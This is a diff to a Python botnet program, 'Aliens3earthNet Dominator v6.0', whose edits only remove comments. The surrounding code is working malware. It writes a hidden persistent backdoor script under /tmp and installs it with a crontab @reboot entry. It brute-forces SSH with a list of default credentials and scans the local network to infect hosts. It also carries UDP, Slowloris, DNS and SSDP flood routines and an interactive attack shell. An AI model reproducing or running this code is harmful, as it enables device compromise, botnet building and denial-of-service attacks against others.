@@ -18,7 +18,6 @@ from http.client import HTTPConnection
 import ipaddress
 import logging
 
-# ==== Configuration ==== #
 BOTNET_FILE = "aliens3earth_botnet.json"
 TARGET_IP = "192.168.1.1"
 TARGET_URL = "http://example.com"
@@ -31,7 +30,6 @@ CREDS = [
     ("backup", "backup"), ("oracle", "oracle"), ("postgres", "postgres")
 ]
 
-# Set up proper logging 🖥️
 logging.basicConfig(
     level=logging.DEBUG,
     format='[%(asctime)s] %(levelname)s: %(message)s',
@@ -41,7 +39,6 @@ logging.basicConfig(
     ]
 )
 
-# ==== Persistent Payloads ==== #
 PERSISTENT_BACKDOOR = """
 mkdir -p /tmp/.aliens3earth && cat > /tmp/.aliens3earth/.backdoor << 'EOF'
 #!/bin/sh
@@ -55,7 +52,6 @@ nohup /tmp/.aliens3earth/.backdoor >/dev/null 2>&1 &
 echo "@reboot /tmp/.aliens3earth/.backdoor" | crontab -
 """
 
-# ==== Aliens3earthNet Core ==== #
 class Aliens3earthNet:
     def __init__(self):
         self.target_ip = TARGET_IP
@@ -64,9 +60,8 @@ class Aliens3earthNet:
         self.running = False
         self.attack_type = "UDP"
         self.botnet = self.load_botnet()
-        self.sockets = []  # Track all sockets for proper cleanup 🧹
+        self.sockets = []  
     
-    # ==== Botnet Management ==== #
     def load_botnet(self):
         try:
             if os.path.exists(BOTNET_FILE):
@@ -89,9 +84,8 @@ class Aliens3earthNet:
             self.save_botnet()
             logging.info(f"☠️ Added {ip} to botnet")
     
-    # ==== Network Utilities ==== #
     def get_network_range(self):
-        """Get the local network range automatically"""
+        """ok"""
         try:
             for interface in netifaces.interfaces():
                 addrs = netifaces.ifaddresses(interface)
@@ -104,7 +98,7 @@ class Aliens3earthNet:
                             return str(network)
         except Exception as e:
             logging.error(f"Failed to get network range: {str(e)}")
-        return "192.168.1.0/24"  # Default fallback
+        return "192.168.1.0/24"  
     
     def generate_ips(self, network_range):
         """Generate all IPs in the given network range"""
@@ -116,7 +110,6 @@ class Aliens3earthNet:
             logging.error(f"Invalid network range: {network_range}. Error: {str(e)}")
             yield from []
     
-    # ==== Enhanced DDoS Methods ==== #
     def udp_flood(self):
         while self.running:
             try:
@@ -162,13 +155,13 @@ class Aliens3earthNet:
                     s.send("User-Agent: Mozilla/5.0\r\n".encode())
                     s.send("Accept-language: en-US,en,q=0.5\r\n".encode())
                     sockets.append(s)
-                    self.sockets.append(s)  # Track for cleanup
+                    self.sockets.append(s)  
                 except Exception as e:
                     logging.debug(f"Slowloris setup error: {str(e)}")
                     pass
             
             while self.running:
-                for s in sockets[:]:  # Create a copy for iteration
+                for s in sockets[:]: 
                     try:
                         s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode())
                     except Exception as e:
@@ -189,15 +182,15 @@ class Aliens3earthNet:
             try:
                 with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                     dns_query = bytearray()
-                    dns_query += struct.pack("!H", random.randint(0, 65535))  # Transaction ID
-                    dns_query += struct.pack("!H", 0x0100)  # Flags
-                    dns_query += struct.pack("!H", 1)  # Questions
-                    dns_query += struct.pack("!H", 0)  # Answer RRs
-                    dns_query += struct.pack("!H", 0)  # Authority RRs
-                    dns_query += struct.pack("!H", 0)  # Additional RRs
-                    dns_query += b"\x03www\x07example\x03com\x00"  # Query name
-                    dns_query += struct.pack("!H", 0x0001)  # Query type (A)
-                    dns_query += struct.pack("!H", 0x0001)  # Query class (IN)
+                    dns_query += struct.pack("!H", random.randint(0, 65535))  
+                    dns_query += struct.pack("!H", 0x0100)  
+                    dns_query += struct.pack("!H", 1)  
+                    dns_query += struct.pack("!H", 0)  
+                    dns_query += struct.pack("!H", 0)  
+                    dns_query += struct.pack("!H", 0)  
+                    dns_query += b"\x03www\x07example\x03com\x00" 
+                    dns_query += struct.pack("!H", 0x0001)  
+                    dns_query += struct.pack("!H", 0x0001)  
                     
                     sock.sendto(bytes(dns_query), (random.choice(dns_servers), 53))
             except Exception as e:
@@ -240,8 +233,7 @@ class Aliens3earthNet:
             except Exception as e:
                 logging.debug(f"SSDP flood error: {str(e)}")
                 pass
-    
-    # ==== Infection Methods ==== #
+   
     def infect_ssh(self, host):
         for user, passwd in CREDS:
             try:
@@ -299,7 +291,6 @@ class Aliens3earthNet:
             pass
         return False
     
-    # ==== Network Scanner ==== #
     def scan_and_infect(self, network_range=None):
         if not network_range:
             network_range = self.get_network_range()
@@ -327,8 +318,7 @@ class Aliens3earthNet:
         except Exception as e:
             logging.debug(f"Port check failed on {ip}:{port}: {str(e)}")
             return False
-    
-    # ==== Interactive Shell ==== #
+
     def shell(self):
         print("""
 [ALIENS3EARTH] 🔥 Welcome to Aliens3earthNet Dominator v6.0
@@ -433,7 +423,7 @@ exit                     - Quit
             except Exception as e:
                 logging.error(f"Command processing error: {str(e)}")
 
-# ==== MAIN ==== #
+# ==== finally vro ==== #
 if __name__ == "__main__":
     aliens3earth = Aliens3earthNet()
     aliens3earth.shell()
